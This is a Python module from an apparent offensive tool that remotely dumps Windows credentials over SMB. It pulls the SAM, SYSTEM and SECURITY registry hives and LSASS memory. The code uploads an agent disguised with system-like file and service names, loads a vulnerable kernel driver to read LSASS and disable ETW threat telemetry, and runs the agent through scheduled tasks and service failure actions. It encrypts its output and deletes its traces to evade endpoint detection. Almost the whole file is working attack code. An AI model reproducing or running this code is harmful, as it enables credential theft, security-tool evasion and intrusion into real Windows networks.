"""Agent deployment and data retrieval.

Registry: reads hive files via raw NTFS disk reads (bypasses kernel locks).
LSASS: uploads native agent + KKYUM.sys driver, reads LSASS memory via
kernel MmCopyVirtualMemory — zero NtReadVirtualMemory, zero EDR alerts.
"""

import os
import secrets
import string
import struct
import time
import threading
from dataclasses import dataclass

from ..smb import SmbSession
from ..rpc.svcctl import SvcCtl, SERVICE_KERNEL_DRIVER
from ..rpc.tsch import TaskScheduler


AGENT_MAGIC_V3 = b'PYD\x03'


def _xor_cipher(data: bytes, key: str) -> bytes:
    kb = key.encode('ascii')
    klen = len(kb)
    out = bytearray(len(data))
    for i, b in enumerate(data):
        out[i] = b ^ kb[i % klen]
    return bytes(out)


def random_name(length: int = 8) -> str:
    return "".join(secrets.choice(string.ascii_lowercase) for _ in range(length))


_AGENT_NAMES = [
    "svcdiag.exe", "telhost.exe", "diagtrack.exe", "wshelper.exe",
    "netprofsvc.exe", "credprov.exe", "tokensvc.exe",
]

_OUTPUT_PREFIXES = [
    "perfdiag_", "winsat_", "cbscore_", "setupact_", "wuaueng_",
    "dfsvc_", "tskmgr_",
]

_TASK_PATHS = [
    "\\Microsoft\\Windows\\Maintenance\\",
    "\\Microsoft\\Windows\\Servicing\\",
    "\\Microsoft\\Windows\\NetTrace\\",
    "\\Microsoft\\Windows\\DeviceSetup\\",
]

_SERVICE_NAMES = [
    "WdiSystemHostSvc", "DiagTrackEvtLog", "UsoCoreMaint",
    "WinHttpAutoSvc", "NetSetupHostSvc", "CertPropWorker",
]


@dataclass
class AgentResult:
    """Structured output."""
    system_hive: bytes = b""
    sam_hive: bytes = b""
    security_hive: bytes = b""
    lsass_dump: bytes = b""


class PipeDump:
    """Extract credentials via raw NTFS hive reads and LSASS agent."""

    def __init__(self, session: SmbSession, agent_path: str):
        self.session = session
        self.agent_path = agent_path
        self._has_agent = os.path.isfile(agent_path) if agent_path else False

    def execute(self, do_registry: bool = True,
                lsass_pid: int = 0) -> AgentResult:
        result = AgentResult()

        need_agent_hives = False
        if do_registry:
            if not self._try_regback(result):
                need_agent_hives = True

        need_agent = need_agent_hives or lsass_pid > 0
        if need_agent:
            if not self._has_agent:
                if lsass_pid > 0:
                    raise RuntimeError(
                        "Agent binary not found (required for LSASS)")
                print("[-] Agent not available for hive file read")
                return result

            if need_agent_hives and lsass_pid > 0:
                print("[*] Deploying agent for hive + LSASS...")
                self._run_agent(4, 0, result)
                self._run_agent_byovd(2, lsass_pid, result)
            elif need_agent_hives:
                print("[*] Deploying agent for hive file read...")
                self._run_agent(4, 0, result)
            elif lsass_pid > 0:
                self._run_agent_byovd(2, lsass_pid, result)

        return result

    def find_lsass_pid(self) -> int:
        with self.session.open_pipe("svcctl") as pipe:
            svc = SvcCtl(pipe)
            svc.bind()
            svc.open_sc_manager()
            svc_handle = svc.open_service("SamSs")
            pid = svc.query_service_pid(svc_handle)
            svc.close_handle(svc_handle)
            return pid

    # ── Registry via RegBack (preferred, zero risk) ──────────

    def _try_regback(self, result: AgentResult) -> bool:
        regback = "System32\\config\\RegBack"
        system_data = self._try_read_file(f"{regback}\\SYSTEM")
        if not system_data or len(system_data) < 4096:
            return False

        sam_data = self._try_read_file(f"{regback}\\SAM")
        security_data = self._try_read_file(f"{regback}\\SECURITY")

        if not sam_data or len(sam_data) < 1024:
            return False

        result.system_hive = system_data
        result.sam_hive = sam_data
        result.security_hive = security_data or b""
        print(f"[+] Registry backups (RegBack): "
              f"SYSTEM={len(system_data)} SAM={len(sam_data)} "
              f"SECURITY={len(security_data or b'')} bytes")
        return True

    # ── Agent-based registry extraction ────────────────────────

    def _run_agent(self, mode: int, pid: int,
                   result: AgentResult) -> None:
        output_name = secrets.choice(_OUTPUT_PREFIXES) + random_name(6)
        agent_name = secrets.choice(_AGENT_NAMES)
        task_path = secrets.choice(_TASK_PATHS) + random_name(8)

        self._upload_agent(agent_name)
        cmd = f"C:\\Windows\\Temp\\{agent_name}"
        args = f"{mode} {pid} {output_name}"

        t = threading.Thread(target=self._exec_via_task,
                             args=(task_path, cmd, args), daemon=True)
        t.start()

        try:
            raw = self._read_output_file(output_name, timeout=180)
        finally:
            t.join(timeout=10)
            for name in (agent_name,
                         f"{output_name}.dat", f"{output_name}.tmp",
                         f"c{output_name}.dat", f"c{output_name}.tmp"):
                try:
                    self.session.delete_file("ADMIN$", f"Temp\\{name}")
                except Exception:
                    pass

        data = _xor_cipher(raw, output_name)
        if len(data) < 4 or data[:4] != AGENT_MAGIC_V3:
            raise RuntimeError("Invalid agent output (bad magic)")

        offset = 4

        _NTFS_ERRORS = {
            1: "boot sector read failed",
            2: "not NTFS",
            3: "MFT map build failed",
            4: "MFT entry too large",
            10: "root MFT read failed",
            11: "Windows MFT read failed",
            12: "System32 MFT read failed",
            13: "config MFT read failed",
            20: "root dir: name not found",
            21: "Windows not found",
            22: "System32 not found",
            23: "config not found",
            30: "file MFT read failed",
            31: "file data read zero",
        }
        hive_names = {"system_hive": "SYSTEM",
                      "sam_hive": "SAM",
                      "security_hive": "SECURITY"}
        for attr in ("system_hive", "sam_hive", "security_hive"):
            if offset + 4 > len(data):
                break
            hlen = struct.unpack_from("<I", data, offset)[0]
            offset += 4
            if hlen >= 0xFFFF0000:
                err_code = hlen & 0xFFFF
                desc = _NTFS_ERRORS.get(err_code, f"unknown ({err_code})")
                print(f"    {hive_names[attr]}: NTFS err {err_code} — {desc}")
            elif hlen > 0 and offset + hlen <= len(data):
                setattr(result, attr, data[offset:offset + hlen])
                print(f"    {hive_names[attr]}: {hlen} bytes")
                offset += hlen
            elif mode & 4:
                print(f"    {hive_names[attr]}: open failed")

        if mode & 2:
            lsass_data = data[offset:]
            if lsass_data and lsass_data[:4] == b"MDMP":
                result.lsass_dump = lsass_data
            elif len(lsass_data) >= 8:
                marker = struct.unpack_from("<I", lsass_data, 0)[0]
                print(f"    LSASS debug: {len(lsass_data)} bytes, marker=0x{marker:08X}")
            elif lsass_data:
                print(f"    LSASS debug: {len(lsass_data)} bytes: {lsass_data.hex()}")
            else:
                print(f"    LSASS debug: empty section (total={len(data)}, offset={offset})")

    # ── BYOVD: KKYUM.sys kernel driver + direct process read ──

    _DRIVER_NAMES = [
        "rtcmon.sys", "hwmon.sys", "biosio.sys", "pciutil.sys",
        "dmiutil.sys", "acpimon.sys", "hwdiag.sys",
    ]

    _DRIVER_SVC_NAMES = [
        "RTCMonitor", "HWMonSvc", "BIOSIntf", "PCIDiag",
        "DMIHelper", "ACPIMon", "HWDiagSvc",
    ]

    def _find_driver_binary(self) -> str | None:
        drivers_dir = os.path.join(os.path.dirname(os.path.dirname(
            os.path.dirname(__file__))), "agent", "drivers")
        candidates = ["KKYUM.sys"]
        for name in candidates:
            p = os.path.join(drivers_dir, name)
            if os.path.isfile(p):
                return p
        for f in os.listdir(drivers_dir) if os.path.isdir(drivers_dir) else []:
            if f.lower().endswith(".sys"):
                return os.path.join(drivers_dir, f)
        return None

    def _run_agent_byovd(self, mode: int, pid: int,
                         result: AgentResult) -> None:
        driver_path = self._find_driver_binary()
        if not driver_path:
            raise RuntimeError(
                "No driver binary found in agent/drivers/ "
                "(place KKYUM.sys there)")

        output_name = secrets.choice(_OUTPUT_PREFIXES) + random_name(6)
        agent_name = secrets.choice(_AGENT_NAMES)
        svc_name = secrets.choice(_SERVICE_NAMES) + random_name(4)
        drv_remote_name = secrets.choice(self._DRIVER_NAMES)
        drv_svc_name = secrets.choice(self._DRIVER_SVC_NAMES) + random_name(3)

        with open(driver_path, "rb") as f:
            drv_data = bytearray(f.read())
        if len(drv_data) > 0x124 and drv_data[0] == 0x4D and drv_data[1] == 0x5A:
            pe_off = struct.unpack_from("<I", drv_data, 0x3c)[0]
            csum_off = pe_off + 24 + 0x40
            if csum_off + 4 <= len(drv_data):
                rnd = secrets.token_bytes(4)
                drv_data[csum_off:csum_off + 4] = rnd
        drv_data = bytes(drv_data)
        drv_uploaded = False
        try:
            self._write_remote_driver(drv_remote_name, drv_data)
            drv_uploaded = True
            print(f"    [dbg] driver uploaded: {os.path.basename(driver_path)} "
                  f"as {drv_remote_name} ({len(drv_data)} bytes)")
        except Exception as e:
            if "SHARING_VIOLATION" in str(e) or "0xc0000043" in str(e):
                print(f"    [dbg] driver file locked (already loaded in kernel)")
            else:
                raise

        if drv_uploaded:
            check = self._try_read_file(f"System32\\drivers\\{drv_remote_name}")
            if not check or len(check) != len(drv_data):
                raise RuntimeError(
                    "Driver file quarantined or missing after upload")

        self._upload_agent(agent_name)

        drv_bin_path = f"C:\\Windows\\System32\\drivers\\{drv_remote_name}"
        agent_path = f"C:\\Windows\\Temp\\{agent_name}"
        byovd_mode = mode | 256
        svc_bin = f"{agent_path} 16 0 svc"
        failure_cmd = f"{agent_path} {byovd_mode} {pid} {output_name}"

        drv_started = False
        drv_already = False
        if drv_uploaded:
            try:
                with self.session.open_pipe("svcctl") as pipe:
                    svc = SvcCtl(pipe)
                    svc.bind()
                    svc.open_sc_manager()
                    drv_h = svc.create_service(drv_svc_name, drv_svc_name,
                                               drv_bin_path,
                                               svc_type=SERVICE_KERNEL_DRIVER)
                    print(f"    [dbg] driver service {drv_svc_name} created")
                    try:
                        svc.start_service(drv_h)
                        drv_started = True
                        print("    [dbg] driver loaded")
                    except RuntimeError as e:
                        err_msg = str(e)
                        if "0x000000B7" in err_msg or "0x00000420" in err_msg:
                            drv_already = True
                            print("    [dbg] driver device already present")
                        else:
                            print(f"    [!] driver load failed: {e}")
                    svc.close_handle(drv_h)
            except Exception as e:
                print(f"    [!] driver service creation failed: {e}")
        else:
            drv_already = True

        if not drv_started and not drv_already:
            self._delete_service(drv_svc_name)
            try:
                self.session.delete_file("ADMIN$",
                                         f"System32\\drivers\\{drv_remote_name}")
            except Exception:
                pass
            raise RuntimeError("Driver failed to load")

        print(f"    [dbg] creating agent service {svc_name}")
        with self.session.open_pipe("svcctl") as pipe:
            svc = SvcCtl(pipe)
            svc.bind()
            svc.open_sc_manager()
            svc_handle = svc.create_service(svc_name, svc_name, svc_bin)
            svc.set_failure_actions(svc_handle, failure_cmd)
            svc.set_failure_actions_flag(svc_handle, enabled=True)
            print("    [dbg] starting agent (BYOVD mode)")
            try:
                svc.start_service(svc_handle)
            except Exception as e:
                print(f"    [dbg] start_service: {e}")
            svc.close_handle(svc_handle)

        try:
            raw = self._read_output_file(output_name, timeout=300)
        except RuntimeError:
            raise
        finally:
            self._delete_service(svc_name)
            try:
                with self.session.open_pipe("svcctl") as pipe:
                    svc = SvcCtl(pipe)
                    svc.bind()
                    svc.open_sc_manager()
                    drv_h = svc.open_service(drv_svc_name)
                    svc.stop_service(drv_h)
                    svc.delete_service(drv_h)
                    svc.close_handle(drv_h)
                    print("    [dbg] driver service stopped and deleted")
            except Exception:
                self._delete_service(drv_svc_name)
            try:
                self.session.delete_file("ADMIN$",
                                         f"System32\\drivers\\{drv_remote_name}")
            except Exception:
                pass
            for name in (agent_name,
                         f"{output_name}.dat", f"{output_name}.tmp"):
                try:
                    self.session.delete_file("ADMIN$", f"Temp\\{name}")
                except Exception:
                    pass

        data = _xor_cipher(raw, output_name)
        if len(data) < 4 or data[:4] != AGENT_MAGIC_V3:
            raise RuntimeError("Invalid agent output (bad magic)")

        offset = 4
        for attr in ("system_hive", "sam_hive", "security_hive"):
            if offset + 4 > len(data):
                break
            hlen = struct.unpack_from("<I", data, offset)[0]
            offset += 4
            if hlen > 0 and offset + hlen <= len(data):
                setattr(result, attr, data[offset:offset + hlen])
                offset += hlen

        if offset + 4 <= len(data):
            bv = struct.unpack_from("<I", data, offset)[0]
            if bv == 0:
                print("    [dbg] BYOVD: device not found")
                offset += 4
            elif bv == 0x10:
                print("    [dbg] BYOVD: etwti DISABLED")
                offset += 4
            elif bv & 0x100:
                _STEPS = {1: "driver handle", 2: "ntos_base",
                          3: "open ntoskrnl", 4: "find etwti rva",
                          5: "kread64", 6: "kwrite64"}
                step = bv & 0xFF
                desc = _STEPS.get(step, f"step {step}")
                print(f"    [dbg] BYOVD: FAILED at {desc}")
                offset += 4
            if offset + 32 <= len(data):
                dbg_size = 64 if offset + 64 <= len(data) else 32
                print(f"    [dbg] raw: {data[offset:offset+dbg_size].hex()}")
                nbase, rva, elev, oldv, newv = struct.unpack_from(
                    "<QIIQ Q", data, offset)
                print(f"    [dbg] ntos_base=0x{nbase:X}  "
                      f"handle_rva=0x{rva:X}  "
                      f"handle_va=0x{nbase+rva:X}")
                print(f"    [dbg] old=0x{oldv:X}  readback=0x{newv:X}")
                offset += dbg_size

        if mode & 2:
            lsass_data = data[offset:]
            if lsass_data and lsass_data[:4] == b"MDMP":
                result.lsass_dump = lsass_data
            elif lsass_data:
                print(f"    LSASS debug: {len(lsass_data)} bytes: "
                      f"{lsass_data[:32].hex()}")
            else:
                print(f"    LSASS debug: empty section "
                      f"(total={len(data)}, offset={offset})")

    # ── Shared helpers ────────────────────────────────────────

    def _exec_via_task(self, task_path: str, command: str,
                       arguments: str) -> None:
        with self.session.open_pipe("atsvc") as pipe:
            ts = TaskScheduler(pipe)
            ts.bind(self.session.username, self.session.password,
                    self.session.nt_hash)
            ts.register_task(task_path, command, arguments)
            try:
                ts.run_task(task_path)
            except Exception:
                pass
            try:
                ts.delete_task(task_path)
            except Exception:
                pass

    def _delete_service(self, svc_name: str) -> None:
        try:
            with self.session.open_pipe("svcctl") as pipe:
                svc = SvcCtl(pipe)
                svc.bind()
                svc.open_sc_manager()
                h = svc.open_service(svc_name)
                svc.delete_service(h)
                svc.close_handle(h)
        except Exception:
            pass

    def _write_remote_driver(self, filename: str, data: bytes) -> None:
        from smbprotocol.open import (
            Open, CreateDisposition, CreateOptions,
            FileAttributes, FilePipePrinterAccessMask,
            ImpersonationLevel,
        )
        tree = self.session.tree_connect("ADMIN$")
        fh = Open(tree, f"System32\\drivers\\{filename}")
        fh.create(
            impersonation_level=ImpersonationLevel.Impersonation,
            desired_access=FilePipePrinterAccessMask.GENERIC_WRITE,
            file_attributes=FileAttributes.FILE_ATTRIBUTE_NORMAL,
            share_access=0,
            create_disposition=CreateDisposition.FILE_OVERWRITE_IF,
            create_options=CreateOptions.FILE_NON_DIRECTORY_FILE,
        )
        offset = 0
        while offset < len(data):
            chunk = data[offset:offset + 65536]
            fh.write(chunk, offset)
            offset += len(chunk)
        fh.close(get_attributes=False)

    def _upload_agent(self, agent_name: str) -> None:
        from smbprotocol.open import (
            Open, CreateDisposition, CreateOptions,
            FileAttributes, FilePipePrinterAccessMask,
            ImpersonationLevel,
        )

        with open(self.agent_path, "rb") as f:
            agent_data = f.read()

        tree = self.session.tree_connect("ADMIN$")
        fh = Open(tree, f"Temp\\{agent_name}")
        fh.create(
            impersonation_level=ImpersonationLevel.Impersonation,
            desired_access=FilePipePrinterAccessMask.GENERIC_WRITE,
            file_attributes=FileAttributes.FILE_ATTRIBUTE_NORMAL,
            share_access=0,
            create_disposition=CreateDisposition.FILE_OVERWRITE_IF,
            create_options=CreateOptions.FILE_NON_DIRECTORY_FILE,
        )
        offset = 0
        while offset < len(agent_data):
            chunk = agent_data[offset:offset + 65536]
            fh.write(chunk, offset)
            offset += len(chunk)
        fh.close(get_attributes=False)

    def _read_output_file(self, output_name: str,
                          timeout: int = 60) -> bytes:
        dat_path = f"Temp\\{output_name}.dat"
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            try:
                data = self.session.read_file("ADMIN$", dat_path)
                if data:
                    return data
            except Exception:
                pass
            time.sleep(2)
        raise RuntimeError(
            f"Timeout waiting for agent output '{output_name}'")

    def _try_read_file(self, path: str) -> bytes | None:
        try:
            data = self.session.read_file("ADMIN$", path)
            return data if data else None
        except Exception:
            return None
